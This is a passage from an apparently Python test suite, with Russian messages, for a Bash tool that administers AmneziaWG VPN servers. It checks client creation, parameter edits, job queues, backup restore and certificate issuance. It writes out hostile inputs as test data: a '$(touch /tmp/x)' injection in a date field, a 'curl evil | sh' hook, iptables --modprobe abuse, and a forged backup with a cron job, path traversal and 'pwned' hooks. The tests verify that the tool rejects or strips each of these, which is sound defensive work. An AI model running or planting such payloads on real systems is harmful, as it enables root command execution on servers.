r = api("client", "add", "victim2", "expire=$(touch /tmp/x);echo 1", "mimicry=none")
chk("срок: команда в дате отбита", r.get("ok") is False and "не распознан" in (r.get("error") or ""), r)
rows = api("clients", "list").get("data") or []
chk("клиент с инъекцией в сроке не создан", not any(c["name"] in ("victim", "victim2") for c in rows), rows)
r = api("client", "add", "okdate", "expire=+30d", "mimicry=none")
chk("валидный срок +30d работает", r.get("ok"), r)
r = api("client", "add", "okabs", "expire=2027-01-01", "mimicry=none")
chk("валидная дата работает", r.get("ok"), r)

# Параметры вручную: проверка, запрет без force, применение, откат
ALICE = os.path.join(ROOT, "root", "alice_awg2.conf")
r = api("server", "params")
d = r.get("data") or {}
chk("api server params — текущие значения", r.get("ok") and d.get("proto") == "2.0" and d["values"]["Jc"] == "5"
    and d["values"]["H1"] == "100-2000" and list(d["values"])[:3] == ["Jc", "Jmin", "Jmax"]
    and d["errors"] == [] and d["changed"] == [] and "ContentPaddingAddition" not in d["values"], r)
r = api("server", "params", "check", "Jc=7", "S2=96", "HeaderProtectionKey=x")
d = r.get("data") or {}
chk("params check: ошибки, изменённые, обязательные для клиентов", r.get("ok") and d["values"]["Jc"] == "7"
    and any("S1 и S2" in e for e in d["errors"]) and any("перегенерацией" in e for e in d["errors"])
    and d["changed"] == ["Jc", "S2"] and d["breaking"] == ["S2"], d)
r = api("server", "params", "set", "S2=96")
chk("params set с ошибкой не пишет конфиг", not r.get("ok") and "S1 и S2" in r["error"]
    and kv(open(conf).read()).get("S2") == "60", r)
r = api("server", "params", "set", "Jc=20")
chk("предупреждение без force — отказ", not r.get("ok") and "force" in r["error"] and "рекомендуется 3-12" in r["log"]
    and kv(open(conf).read()).get("Jc") == "5", r)
reset_calls()
r = api("server", "params", "set", "force", "Jc=20", "Jmax=100")
d = r.get("data") or {}
chk("params set force: сервер, клиенты, рестарт", r.get("ok") and d.get("changed") == ["Jc", "Jmax"]
    and d.get("breaking") == [] and d.get("clients", 0) >= 2 and kv(open(conf).read()).get("Jc") == "20"
    and kv(open(ALICE).read()).get("Jmax") == "100" and kv(open(ALICE).read()).get("S1") == "40"
    and "awg-quick up" in calls() and "продолжают работать" in r.get("log", ""), [r, calls()])
BK = os.path.join(ROOT, "awg_backup")
chk("правка оставляет авто-бэкап", os.path.isdir(BK) and any(n.startswith("auto_params_") for n in os.listdir(BK)),
    os.listdir(BK) if os.path.isdir(BK) else "нет каталога")
r = api("server", "params", "set", "H1=10000-20000")
chk("смена H — клиентам нужны новые конфиги", r.get("ok") and r["data"]["breaking"] == ["H1"]
    and "обязаны совпадать" in r.get("log", "") and kv(open(ALICE).read()).get("H1") == "10000-20000", r)
r = api("server", "params", "set", "Jc=20")
chk("без изменений — без рестарта", r.get("ok") and "не изменились" in r.get("log", ""), r)
FAILBIN = os.path.join(TMP, "failbin")
os.makedirs(FAILBIN, exist_ok=True)
with open(os.path.join(FAILBIN, "awg-quick"), "w") as f:
    f.write('#!/usr/bin/env bash\n[[ "$1" == up ]] && { echo "Unable to modify interface: Invalid argument" >&2; exit 1; }\nexit 0\n')
os.chmod(os.path.join(FAILBIN, "awg-quick"), 0o755)
r = api("server", "params", "set", "S1=45", env={"PATH": FAILBIN + ":" + ENV["PATH"]})
chk("awg0 не поднялся — откат сервера и клиентов", not r.get("ok") and kv(open(conf).read()).get("S1") == "40"
    and kv(open(ALICE).read()).get("S1") == "40" and "возвращаю прежние" in r.get("log", ""), r)
rc, out, _ = bash('printf "S1 = 86\\nS2 = 48\\nS3 = 16\\nS4 = 12\\nH1 = 1\\nH2 = 2\\nH3 = 3\\nH4 = 4\\nJc = 4\\nJmin = 10\\nJmax = 50\\n'
                  'HeaderProtectionKey = K=\\nRekeyAfterTime = 115-150\\nRejectAfterTime = 180-210\\nRandomTrailers = on\\nDisableCookies = on\\n" '
                  '| py params-check 3.1 1280 S3=8 RejectAfterTime=140-200 DisableCookies=off')
chk("3.1: S ≥ 12, RejectAfterTime > RekeyAfterTime, off убирает ключ",
    "E\tS3 = 8" in out and "RejectAfterTime должен" in out and "K\tDisableCookies\toff" in out
    and "P\tDisableCookies" not in out and "P\tRandomTrailers = on" in out and "B\tS3" in out, out)

# Перезапуск бота по просьбе самого бота — отложенный: awg2 живёт в cgroup
# бота и обязан успеть ответить до того, как systemd его остановит
with open(ACTIVE, "a") as f:
    f.write("awg-bot.service\n")
reset_calls()
t0 = time.time()
r = api("bot", "restart")
quick_log = calls()
chk("api bot restart отвечает сразу, до перезапуска", r.get("ok") and time.time() - t0 < 2
    and "systemctl restart awg-bot.service" not in quick_log, [r.get("error"), quick_log[-200:]])
time.sleep(3)
chk("бот перезапускается через пару секунд", "systemctl restart awg-bot.service" in calls(), calls()[-300:])
open(ACTIVE, "w").close()

# Очередь: пока занят замок, изменяющая команда отказывает, чтение — нет
lock = os.path.join(ROOT, "var/lib/awg2/api.lock")
holder = subprocess.Popen(["flock", lock, "sleep", "8"])
time.sleep(0.5)
r = api("client", "del", "t-001", env={"API_LOCK_WAIT": "1"})
chk("занятая очередь — rc 75", r.get("ok") is False and r["rc"] == 75 and "другая операция" in r["error"], r)
r = api("clients", "list")
chk("чтение мимо очереди", r.get("ok") is True, r)
r = api("traffic", "now", env={"API_LOCK_WAIT": "1"})
chk("живая скорость (traffic now) — мимо очереди", r.get("ok") is True, r)
# Чтение — только точные команды по словам: хвост «info» или слово с пробелом
# внутри не делают запись чтением
r = api("antiscan", "allow", "add", "1.2.3.4", "info", env={"API_LOCK_WAIT": "1"})
r2 = api("antiscan", "allow add 1.2.3.4 info", env={"API_LOCK_WAIT": "1"})
r3 = api("client", "conf x", "info", env={"API_LOCK_WAIT": "1"})
chk("запись с хвостом «info» или словом с пробелом внутри — в очередь, а не мимо",
    r.get("rc") == 75 and r2.get("rc") == 75 and r3.get("rc") == 75, [r, r2, r3])
rr = {" ".join(a): api(*a, env={"API_LOCK_WAIT": "1"}).get("rc") for a in (
    ("antiscan", "status"), ("server", "info"), ("log", "antiscan", "5"), ("cert",), ("bot", "proxy", "get"))}
chk("чтения бота и панели — по-прежнему мимо очереди", all(v != 75 for v in rr.values()), rr)
holder.kill()
holder.wait()

# Фоновая задача: старт, опрос журнала по смещению, итог
r = api("job", "start", "diag", "dpi-hint")
jid = (r.get("data") or {}).get("id", "")
chk("api job start", r.get("ok") and re.match(r"^\d{8}-\d{6}-[0-9a-f]{4}$", jid), r)
st, log, off = {}, "", 0
for _ in range(60):
    st = api("job", "status", jid, str(off)).get("data") or {}
    log += st.get("log", "")
    off = st.get("offset", off)
    if st.get("state") != "running":
        break
    time.sleep(0.5)
chk("задача завершилась", st.get("state") == "done" and st.get("ok") is True and st.get("rc") == 0, st)
chk("журнал задачи без цвета", "dpi-detector" in log and "\x1b[" not in log, log[:200])
r = api("job", "list")
chk("api job list", r.get("ok") and r["data"] and r["data"][0]["id"] == jid and r["data"][0]["state"] == "done", r)
r = api("job", "start", "bogus")
jid = (r.get("data") or {}).get("id", "")
for _ in range(60):
    st = api("job", "status", jid).get("data") or {}
    if st.get("state") != "running":
        break
    time.sleep(0.5)
chk("ошибка задачи в итоге", st.get("state") == "done" and st.get("ok") is False and st.get("rc") == 2, st)

print("Бэкап")
r = api("backup", "create")
bk_path = (r.get("data") or {}).get("path") or ""
chk("бэкап — в каталоге песочницы, не в настоящем ~/awg_backup",
    r.get("ok") and bk_path.startswith(os.path.join(ROOT, "awg_backup")), r)
r = api("backup", "list")
chk("архив бэкапа в списке", bk_path in [b["path"] for b in r.get("data") or []], r)
# Автобэкап бота: только архив *_auto.tar.gz, из таких остаются последние N
BKD = os.path.join(ROOT, "awg_backup")
for d in ("20200101_000000", "20200102_000000", "20200103_000000"):
    open(os.path.join(BKD, f"awg2_backup_{d}_auto.tar.gz"), "w").close()
r = api("backup", "create", "auto", "2")
autos = sorted(f for f in os.listdir(BKD) if f.endswith("_auto.tar.gz"))
chk("автобэкап: архив без каталога, старые автобэкапы сверх N удалены, ручной не тронут",
    r.get("ok") and r["data"]["path"].endswith("_auto.tar.gz") and len(autos) == 2
    and autos[0] == "awg2_backup_20200103_000000_auto.tar.gz" and os.path.basename(r["data"]["path"]) == autos[1]
    and not os.path.isdir(r["data"]["path"][:-7]) and os.path.exists(bk_path), [r, autos])
rc, out, _ = bash('tar() { if [[ "$1" == -czf && "$2" == *_auto.tar.gz ]]; then echo partial > "$2"; return 1; fi; command tar "$@"; }; '
                  'backup_create archive auto 2 2>&1; echo "rc=$?"')
after = sorted(f for f in os.listdir(BKD) if "_auto" in f)
chk("автобэкап: архив не записался — ошибка, ни обрезка, ни каталога с ключами, целые не тронуты",
    "rc=1" in out and "Архив бэкапа не записан" in out and after == autos, [out[-300:], after])
for f in autos:
    os.remove(os.path.join(BKD, f))
r = api("backup", "inspect", bk_path)
chk("inspect: клиенты и метаданные", r.get("ok") and r["data"]["clients"] >= 2 and "timestamp=" in r["data"]["meta"], r)
junk = os.path.join(TMP, "junk.tar.gz")
with open(junk, "wb") as f:
    f.write(b"not a tar")
r = api("backup", "inspect", junk)
chk("не архив — понятная ошибка без трассировки Python",
    r.get("ok") is False and "это не архив" in r.get("log", "") and "Traceback" not in r.get("log", ""), r)
# Клиент, созданный после бэкапа, — сирота после восстановления: его конфиг убирается;
# конфиги клиентов, которые в awg0 бэкапа есть, остаются на месте
api("client", "add", "late", "mimicry=none")
LATE = os.path.join(ROOT, "root", "late_awg2.conf")
r = api("backup", "restore", bk_path)
chk("восстановление из архива", r.get("ok") and "Восстановлено" in r.get("log", ""), r)
chk("restore: конфиг клиента не из бэкапа убран, остальные на месте",
    not os.path.exists(LATE) and os.path.exists(ALICE)
    and not any(c["name"] == "late" for c in api("clients", "list").get("data") or []), os.listdir(os.path.join(ROOT, "root")))

# Сервера ещё нет: мастер в боте и панели спрашивает server info — поддержка 3.1
# проверяется честно (раньше был жёсткий «нет»), пробный интерфейс — один раз
awg_stub = os.path.join(BIN, "awg")
stub_body = open(awg_stub).read()
with open(awg_stub, "a") as f:
    f.write("# RandomTrailers\n")
NOSRV = 'echo v3.1.20260906 > "$MOD_TAG_FILE"; rm -f "$STATE_DIR/proto31"; SERVER_CONF="$STATE_DIR/none/awg0.conf"; '
reset_calls()
rc, out, _ = bash(NOSRV + "api_main server info; api_main server info >/dev/null")
d = json.loads(out.strip().splitlines()[0])
chk("без сервера: модуль и tools умеют 3.1 — мастер предложит AWG 3.1",
    d["data"]["exists"] is False and d["data"]["proto31"] is True and d["log"] == "", d)
chk("без сервера: пробный интерфейс — один раз, дальше ответ из памяти", calls().count("ip link add") == 1, calls())
rc, out, _ = bash(NOSRV.replace("v3.1.20260906", "v2.0.0").replace('rm -f "$STATE_DIR/proto31"; ', "") + "api_main server info")
chk("модуль сменился на 2.0 — ответ пересчитан: 3.1 нет", json.loads(out)["data"]["proto31"] is False, out)
chk("…и причина для мастера — модуль (кнопка «Модуль и tools»); при 3.1 причины нет",
    json.loads(out)["data"]["proto31_why"] == "module" and d["data"]["proto31_why"] == "", [out, d])
open(awg_stub, "w").write(stub_body)
rc, out, _ = bash(NOSRV + "api_main server info")
chk("tools без ключа 3.1 — причина tools (обновление одного модуля 3.1 не даст)",
    json.loads(out)["data"]["proto31"] is False and json.loads(out)["data"]["proto31_why"] == "tools", out)
rc, out, _ = bash("PATH=/nonexistent; proto_why 3.1")
chk("awg не установлен — причина components (мастер сначала ставит компоненты)", out.strip() == "components", out)
rc, out, _ = bash("mod_update_flow() { echo M; }; tools_update_flow() { echo T; }; components_update_flow; echo rc=$?; "
                  "mod_update_flow() { echo M; return 1; }; components_update_flow; echo rc=$?")
chk("module all: модуль, затем tools; модуль не собрался — tools не трогаются",
    out.split() == ["M", "T", "rc=0", "M", "rc=1"], out)
bash('rm -f "$STATE_DIR/proto31"')

# Бэкап с другого VPS: аплинк там назывался иначе (eth0 → ens3) — NAT в awg0.conf
# переводится на аплинк этого сервера, иначе клиенты остались бы без интернета
orig_conf = open(conf).read()
_, pl, _ = bash("_postup_lines 10.23.45.0/24 eth0")
eth0_conf = orig_conf.replace("PostUp = true\nPostDown = true\n", pl)
open(conf, "w").write(eth0_conf)
rc, out, _ = bash("conf_uplink")
chk("NAT в awg0.conf — на аплинк, где создан сервер", eth0_conf != orig_conf and out.strip() == "eth0", out)
rc, out, _ = bash('uplink_iface() { echo ens3; }; conf_uplink_sync >/dev/null; echo "rc=$?"; conf_uplink_sync; echo "rc2=$?"')
post = [ln for ln in open(conf).read().splitlines() if ln.startswith(("PostUp", "PostDown"))]
chk("аплинк сменился — PostUp и PostDown на новом, FORWARD awg0 не тронут, повтор ничего не меняет",
    "rc=0" in out and "rc2=1" in out and len(post) == 2
    and all("-o ens3 -j MASQUERADE" in ln and "-o eth0" not in ln for ln in post) and "-o awg0 -j ACCEPT" in post[0],
    [out, post])
BK_ETH0 = os.path.join(TMP, "bk_eth0")
os.makedirs(BK_ETH0)
with open(os.path.join(BK_ETH0, "awg0.conf"), "w") as f:
    f.write(eth0_conf)
rc, out, _ = bash("AUTO_MODE=1; uplink_iface() { echo ens3; }; " + f"backup_restore '{BK_ETH0}' 2>&1")
now_conf = open(conf).read()
chk("восстановление бэкапа с eth0 на сервер с ens3 — NAT сразу на ens3",
    rc == 0 and "eth0 → ens3" in out and "-o ens3 -j MASQUERADE" in now_conf and "-o eth0 -j MASQUERADE" not in now_conf, out[-600:])
rc, out, _ = bash("AUTO_MODE=1; do_repair 2>&1")
now_conf = open(conf).read()
chk("«Проверить и починить» возвращает NAT на настоящий аплинк навсегда — в awg0.conf",
    "на ens3, такого интерфейса нет; выход сервера — eth0" in out and "NAT перенесён на eth0" in out
    and "-o eth0 -j MASQUERADE" in now_conf and "-o ens3" not in now_conf, out[-800:])
# Интерфейс из awg0.conf на этом сервере есть — NAT через него выбран
# сознательно: не переписывается и не перебивается правилом на аплинк
open(conf, "w").write(eth0_conf.replace("-o eth0 ", "-o tun9 "))
links_saved = open(LINKS).read()
with open(LINKS, "a") as f:
    f.write("tun9\n")
open(CALLS, "w").close()
rc, out, _ = bash('conf_uplink_sync; echo "rc=$?"; AUTO_MODE=1; do_repair 2>&1')
now_conf = open(conf).read()
chk("NAT на существующем интерфейсе — оставлен, проверяется на нём же",
    "rc=1" in out and "оставляю как настроено" in out and "-o tun9 -j MASQUERADE" in now_conf
    and "-o eth0 -j MASQUERADE" not in open(CALLS).read(), [out[-800:], open(CALLS).read()[-600:]])
open(LINKS, "w").write(links_saved)
BK_TUN9 = os.path.join(TMP, "bk_tun9")
os.makedirs(BK_TUN9, exist_ok=True)
with open(os.path.join(BK_TUN9, "awg0.conf"), "w") as f:
    f.write(eth0_conf.replace("-o eth0 ", "-o tun9 "))
with open(LINKS, "a") as f:
    f.write("tun9\n")
rc, out, _ = bash(f"AUTO_MODE=1; uplink_iface() {{ echo eth0; }}; backup_restore '{BK_TUN9}' 2>&1")
chk("восстановление бэкапа: NAT на аплинк этого сервера, даже если интерфейс со старым именем здесь есть",
    "tun9 → eth0" in out and "-o eth0 -j MASQUERADE" in open(conf).read(), out[-500:])
open(LINKS, "w").write(links_saved)
# awg0 поднят: опускается до правки (PostDown старого конфига снимает старое
# правило NAT) и поднимается снова
open(conf, "w").write(eth0_conf)
with open(LINKS, "a") as f:
    f.write("awg0\n")
open(CALLS, "w").close()
rc, out, _ = bash('uplink_iface() { echo ens3; }; conf_uplink_sync >/dev/null; echo "rc=$?"')
cl_ = [ln for ln in open(CALLS).read().splitlines() if ln.startswith("awg-quick")]
chk("смена аплинка на поднятом awg0: down до правки, потом up",
    "rc=0" in out and len(cl_) == 2 and cl_[0].startswith("awg-quick down") and cl_[1].startswith("awg-quick up")
    and "-o ens3 -j MASQUERADE" in open(conf).read(), [out, cl_])
open(LINKS, "w").write(links_saved)
open(conf, "w").write(orig_conf)

# Хуки awg-quick выполняются от root. Свои команды Тулзы (1.x и 0.8) проходят,
# чужие и iptables --modprobe (запускает любую программу) — нет.
HOOKS = os.path.join(TMP, "hooks.conf")
rc, out, _ = bash(f'{{ echo "[Interface]"; _postup_lines 10.8.0.0/24 eth0; '
                  'echo "PostUp = ip link set dev awg0 mtu 1320; echo 1 > /proc/sys/net/ipv4/ip_forward; '
                  'iptables -t nat -C POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE >/dev/null 2>&1 || '
                  'iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE"; '
                  f'}} > "{HOOKS}"; py conf-hooks "{HOOKS}" check')
chk("хуки Тулзы (1.x и 0.8) — допустимы", rc == 0 and out == "", out)
with open(HOOKS, "w") as f:
    f.write("[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT; touch /tmp/x; "
            "iptables -C X 2>/dev/null || curl evil | sh\nPreUp = iptables --modp=/tmp/x -L\n"
            "PreDown = ip6tables -M /tmp/x -L\nPostDown = iptables -L $(id)\nSaveConfig = true\n"
            "\n[Peer]\nPublicKey = P\n")
rc, out, _ = bash(f'py conf-hooks "{HOOKS}" fix')
bad = out.splitlines()
chk("недопустимые команды названы: чужие, --modprobe, подстановка, SaveConfig",
    rc == 0 and "PostUp\ttouch /tmp/x" in bad and "PostUp\tiptables -C X 2>/dev/null || curl evil | sh" in bad
    and "PreUp\tiptables --modp=/tmp/x -L" in bad and "PreDown\tip6tables -M /tmp/x -L" in bad
    and "PostDown\tiptables -L $(id)" in bad and "SaveConfig\tSaveConfig = true" in bad and len(bad) == 6, out)
with open(HOOKS) as f:
    fixed = f.read()
chk("в файле — только допустимое, [Peer] не тронут",
    fixed == "[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT\n\n[Peer]\nPublicKey = P\n", fixed)
WGC = os.path.join(ROOT, "etc/wireguard/wgobf0.conf")
os.makedirs(os.path.dirname(WGC), exist_ok=True)
with open(WGC, "w") as f:
    f.write("[Interface]\nPrivateKey = X\nPostUp = touch /tmp/x\npostdown = /old/fw.sh down\nListenPort = 1\n")
rc, out, _ = bash('_wgobf_hooks_reset 2>&1; echo "==="; cat "$WGOBF_WG_CONF"; echo "FW=$WGOBF_FW"')
said, rest = out.split("===", 1)
conf_text, fw = rest.rsplit("FW=", 1)
fw = fw.strip()
chk("wgobf0 из бэкапа: хуки — ровно скрипт Тулзы, о чужих — предупреждение",
    conf_text.strip() == f"[Interface]\nPostUp = {fw} up\nPostDown = {fw} down\nPrivateKey = X\nListenPort = 1"
    and "чужие команды" in said and "touch /tmp/x" in said and "/old/fw.sh down" in said, out)
with open(WGC, "w") as f:
    f.write(" [interface]\r\nPrivateKey = X\r\nPostUp = touch /tmp/x\r\nListenPort = 1\r\n")
rc, out, _ = bash('_wgobf_hooks_reset >/dev/null 2>&1; echo "rc=$?"; cat "$WGOBF_WG_CONF"')
chk("wgobf0 из бэкапа: « [interface]» и CRLF — заголовок приведён, хуки Тулзы на месте",
    out.startswith("rc=0\n") and f"[Interface]\nPostUp = {fw} up\nPostDown = {fw} down\nPrivateKey = X\nListenPort = 1" in out
    and b"\r" not in open(WGC, "rb").read(), repr(out))   # вывод bash() — text=True, \r\n там уже \n
with open(WGC, "w") as f:
    f.write("PrivateKey = X\n")
rc, out, _ = bash('_wgobf_hooks_reset >/dev/null 2>&1; echo "rc=$?"')
chk("wgobf0 из бэкапа без секции [Interface] — ошибка, а не обфускатор без файрвола", out.strip() == "rc=1", out)

# Подделанный бэкап: в awg0.conf — команды не из Тулзы, в архиве туннелей —
# файл вне путей Тулзы, exit-нода с хуком, мусор в каскаде и tun2socks,
# чужой toml dnscrypt-proxy; в каталоге WARP — «скрипт автозапуска».
# Прежде tunnels.tar.gz распаковывался прямо в / как есть.
import io
import shutil
import tarfile
EVIL = os.path.join(TMP, "evil")
shutil.rmtree(EVIL, ignore_errors=True)
with tarfile.open(bk_path) as t:
    t.extractall(EVIL)
top = os.path.join(EVIL, os.listdir(EVIL)[0])
with open(os.path.join(top, "awg0.conf")) as f:
    srv = f.read()
srv = srv.replace("[Interface]\n", "[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT; "
                  f"touch {TMP}/pwned\nSaveConfig = true\n", 1)
with open(os.path.join(top, "awg0.conf"), "w") as f:
    f.write(srv)
os.makedirs(os.path.join(top, "warp/wgcf"), exist_ok=True)
for name, body in (("warp-autostart.sh", f"#!/bin/sh\ntouch {TMP}/pwned\n"), ("wgcf-account.toml", "acct\n")):
    with open(os.path.join(top, "warp/wgcf", name), "w") as f:
        f.write(body)
AWGD = os.path.join(ROOT, "etc/amnezia/amneziawg")
members = {
    os.path.join(ROOT, "etc/cron.d/evil"): "* * * * * root touch /tmp/pwned\n",
    os.path.join(AWGD, "awg-exit-n2.conf"): "[Interface]\nPrivateKey = X\nAddress = 10.9.0.2/32\n"
                                            f"PostUp = touch {TMP}/pwned\n\n[Peer]\nPublicKey = P\n"
                                            "Endpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n",
    os.path.join(AWGD, "awg-exit-../x.conf"): "[Interface]\n",
    os.path.join(ROOT, "etc/awg-cascade/rules.conf"): "udp|4443|5.6.7.8|443|ok\nudp|1;id|5.6.7.8|443|bad\n"
        "tcp|8080|10.0.0.5|80|private\nudp|4444|010.0.0.1|443|zeros\ntcp|99999|5.6.7.8|443|port\n"
        "udp|51820|5.6.7.8|443|awgport\nudp|4443|5.6.7.9|443|dup\n",
    os.path.join(ROOT, "etc/xray/config.json"): json.dumps({
        "log": {"access": "/etc/cron.d/x"}, "api": {"tag": "api", "services": ["HandlerService"]},
        "inbounds": [{"tag": "socks-in", "protocol": "socks", "listen": "0.0.0.0", "port": 10808},
                     {"tag": "open", "protocol": "socks", "listen": "0.0.0.0", "port": 1080},
                     {"tag": "api-in", "protocol": "dokodemo-door", "listen": "0.0.0.0", "port": 10085}],
        "outbounds": [{"tag": "proxy_a", "protocol": "vless", "settings": {}}, {"tag": "direct", "protocol": "freedom"}],
        "routing": {"rules": [{"inboundTag": ["api-in"], "outboundTag": "api"},
                              {"inboundTag": ["socks-in"], "outboundTag": "proxy_a"}]}}),
    os.path.join(ROOT, "etc/tun2socks/proxy.txt"): "127.0.0.1:1080;touch x\n",
    os.path.join(ROOT, "etc/dnscrypt-proxy/dnscrypt-proxy.toml"):
        "server_names = ['quad9-doh-ip4-port443-nofilter-pri']\n[query_log]\n  file = '/etc/cron.d/x'\n",
}
with tarfile.open(os.path.join(top, "tunnels.tar.gz"), "w:gz") as t:
    for path, body in members.items():
        data = body.encode()
        ti = tarfile.TarInfo(path.lstrip("/"))
        ti.size = len(data)
        t.addfile(ti, io.BytesIO(data))
EVIL_TGZ = os.path.join(TMP, "evil_backup.tar.gz")
with tarfile.open(EVIL_TGZ, "w:gz") as t:
    t.add(top, arcname=os.path.basename(top))
r = api("backup", "restore", EVIL_TGZ, "tunnels")
log = r.get("log", "")
with open(os.path.join(AWGD, "awg0.conf")) as f:
    srv = f.read()
chk("restore чужого бэкапа: из awg0.conf убраны команды не из Тулзы, о них — в итоге",
    r.get("ok") and "Команды убраны" in log and "pwned" in log and "--dport 2222" in srv
    and "pwned" not in srv and "SaveConfig" not in srv, [log[-600:], srv[:300]])
chk("архив туннелей не распаковывается в /: файл вне путей Тулзы не появился",
    not os.path.exists(os.path.join(ROOT, "etc/cron.d/evil")) and not os.path.exists("/etc/cron.d/evil"))
EXIT2 = os.path.join(AWGD, "awg-exit-n2.conf")
with open(EXIT2) as f:
    ex2 = f.read()
chk("exit-нода из бэкапа — без хуков, с Table = off", "PostUp" not in ex2 and "Table = off" in ex2
    and not os.path.exists(os.path.join(AWGD, "x.conf")), ex2)
nodes = {n["name"]: n for n in (api("exits", "status").get("data") or {}).get("nodes") or []}
chk("api exits status — у ноды адрес, протокол и счётчики",
    nodes.get("n2", {}).get("endpoint") == "1.2.3.4:51820" and nodes["n2"]["proto"] == "wg"
    and nodes["n2"]["up"] is False and nodes["n2"]["rx"] == 0 and nodes["n2"]["hs"] == 0, nodes)
# Поднятая нода: проверка выхода в интернет через неё (curl) — только по «status check»
with open(LINKS) as f:
    links0 = f.read()
with open(LINKS, "a") as f:
    f.write("awg-exit-n2\n")
t0 = time.time()
r = api("exits", "status", env={"PATH": SLOW + ":" + ENV["PATH"]})
chk("api exits status не ждёт проверку выхода через ноды (её зовут список клиентов и обзор)",
    r.get("ok") and time.time() - t0 < 4 and "интернет" not in r.get("log", ""), [time.time() - t0, r.get("log", "")[-300:]])
r = api("exits", "status", "check")
chk("api exits status check — с проверкой выхода в интернет через ноду", r.get("ok") and "интернет" in r.get("log", ""),
    r.get("log", "")[-300:])
with open(LINKS, "w") as f:
    f.write(links0)
with open(os.path.join(ROOT, "etc/awg-cascade/rules.conf")) as f:
    rules = f.read()
chk("каскад из бэкапа — только с проверками добавления: публичная цель, порты, вход не занят, без дублей",
    rules == "udp|4443|5.6.7.8|443|ok\n" and "10.0.0.5" in log and "010.0.0.1" in log and "51820" in log, [rules, log[-900:]])
CRF, CRO = os.path.join(TMP, "cr-in"), os.path.join(TMP, "cr-out")
with open(CRF, "w", newline="") as f:
    f.write("udp|4443|5.6.7.8|443|a\r\nudp|4445|5.6.7.9|443\r\ntcp|4446|5.6.7.9|443|last")
rc, out, _ = bash(f'CASCADE_RULES="{CRO}"; write_file() {{ cat > "$1"; }}; _restore_cascade_rules "{CRF}" 2>&1; cat "{CRO}"')
chk("каскад из бэкапа: CRLF и последняя строка без перевода строки — не теряются",
    out.strip().splitlines()[-3:] == ["udp|4443|5.6.7.8|443|a", "udp|4445|5.6.7.9|443|", "tcp|4446|5.6.7.9|443|last"], out)
with open(os.path.join(ROOT, "etc/xray/config.json")) as f:
    xr = json.load(f)
chk("Xray из бэкапа: выходы и маршруты — да, чужие входы, API и журнал — нет",
    [o["tag"] for o in xr["outbounds"]] == ["proxy_a", "direct"] and xr["inbounds"] == []
    and "api" not in xr and "log" not in xr
    and xr["routing"]["rules"] == [{"inboundTag": ["socks-in"], "outboundTag": "proxy_a"}]
    and "Из конфига Xray бэкапа убрано" in log and "api-in" in log, [xr, log[-600:]])
# Чужой тег своего входа tun и кривые записи: главное правило не теряется
XRC = os.path.join(TMP, "xrc.json")
with open(XRC, "w") as f:
    json.dump({"inbounds": [{"protocol": "tun", "tag": "tun"}, {"protocol": "socks", "tag": "evil\u001b[2J"}, "x", ["y"],
                            {"protocol": "socks", "tag": ["list"]}],
               "outbounds": [{"protocol": "vless", "tag": "a"}, {"protocol": "vless", "tag": "b"},
                             {"protocol": "freedom", "tag": "direct"}, {"protocol": "vless", "tag": ["z"]}],
               "routing": {"balancers": "oops", "rules": [
                   {"inboundTag": ["tun"], "outboundTag": "b"}, {"inboundTag": [["x"]], "outboundTag": "a"},
                   {"outboundTag": ["a"]}, "junk"]}}, f)
rc, out, err = bash(f'py xray-restore-clean "{XRC}" && py xray-prepare "{XRC}" native && py xray-main-get "{XRC}"')
xc = json.load(open(XRC))
chk("Xray из бэкапа: правило своего tun с чужим тегом сохраняется (выход b), кривые записи — убраны без падения",
    rc == 0 and out.strip().splitlines()[-1] == "b" and "\x1b" not in out and "Traceback" not in err
    and [r for r in xc["routing"]["rules"] if r.get("inboundTag")] == [{"inboundTag": ["tun-in"], "outboundTag": "b"}],
    [out, err[-300:], xc["routing"]])
chk("адрес tun2socks не по формату не восстановлен", not os.path.exists(os.path.join(ROOT, "etc/tun2socks/proxy.txt")))
with open(os.path.join(ROOT, "etc/dnscrypt-proxy/dnscrypt-proxy.toml")) as f:
    toml = f.read()
chk("dnscrypt-proxy — шаблон Тулзы, из бэкапа только резолверы",
    "AWG Toolza" in toml and "server_names = ['quad9-doh-ip4-port443-nofilter-pri']" in toml
    and "query_log" not in toml and "cron" not in toml, toml)
chk("WARP: данные аккаунта — да, скрипт автозапуска из бэкапа — нет",
    os.path.exists(os.path.join(ROOT, "etc/wgcf/wgcf-account.toml"))
    and not os.path.exists(os.path.join(ROOT, "etc/wgcf/warp-autostart.sh")))
chk("ничего из бэкапа не выполнилось", not os.path.exists(os.path.join(TMP, "pwned")))

print("Сертификат")
fake_acme()
CERT = os.path.join(ROOT, "etc/awg2/cert/fullchain.pem")
r = api("cert")
chk("cert status: сертификата нет, IP сервера известен",
    r.get("ok") and r["data"]["installed"] is False and r["data"]["ip"] == "203.0.113.10", r)
reset_calls()
r = api("cert", "issue", "ip")
c = calls()
chk("сертификат на IP: Let's Encrypt, http-01 на 80-м порту, профиль shortlived, продление через 3 дня",
    r.get("ok") and "--issue --server letsencrypt -d 203.0.113.10 --standalone --httpport 80" in c
    and "--cert-profile shortlived --days 3" in c, [r.get("log"), c[-500:]])
st = api("cert", "status").get("data") or {}
chk("сертификат на месте, срок читается",
    st.get("installed") and st.get("kind") == "ip" and st.get("name") == "203.0.113.10"
    and (st.get("expires") or 0) > time.time() + 5 * 86400 and oct(os.stat(CERT.replace("fullchain", "key")).st_mode)[-3:] == "600", st)
with open(os.path.join(ROOT, "units", "awg2-cert.service")) as f:
    unit = f.read()
chk("таймер продления: acme.sh --cron со своим каталогом",
    "--cron --home" in unit and os.path.exists(os.path.join(ROOT, "units", "awg2-cert.timer")), unit)
r = api("cert", "issue", "ip")
chk("повторный выпуск: acme.sh ответил «рано продлевать» — не ошибка", r.get("ok"), r)
r = api("cert", "issue", "domain", "bad_domain")
chk("домен проверяется", not r.get("ok") and "домен" in (r.get("error") or ""), r)
r = api("cert", "issue", "domain", "nothing.invalid")
chk("домен без A-записи — понятная ошибка", not r.get("ok") and "не резолвится" in (r.get("error") or ""), r)

with open(os.path.join(ROOT, "bot.conf"), "w") as f:
    f.write('BOT_TOKEN="1:AA"\nADMIN_ID=11\n')
r = api("bot", "webapp", "get")
chk("Mini App: порт по умолчанию 8443, адрес по сертификату",
